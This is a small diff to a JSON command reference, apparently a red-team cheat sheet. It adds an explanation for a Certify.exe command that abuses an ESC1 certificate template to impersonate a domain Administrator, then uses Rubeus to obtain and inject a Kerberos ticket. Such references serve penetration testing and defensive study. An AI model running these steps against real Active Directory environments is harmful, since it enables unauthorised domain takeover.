@@ -142,5 +142,6 @@
       "label": "EA impersonation via /altname",
       "command": "Certify.exe request /ca:<ca_server>\\<ca_name> /template:<vuln_template> /altname:<domain>\\Administrator"
     }
-  ]
+  ],
+  "explain": "Requests a certificate from an ESC1 template (enrollee supplies the subject) to impersonate any user:\n  request                   enroll a certificate\n  /ca:<ca_server>\\<ca_name> the issuing CA to submit to\n  /template:<template_name> the ENROLLEE_SUPPLIES_SUBJECT template\n  /altname:<user>           the account to impersonate (set to Administrator for DA)\nYou receive a cert as that user; convert PEM to PFX and feed it to Rubeus asktgt to PKINIT and get their TGT (/ptt injects it)."
 }
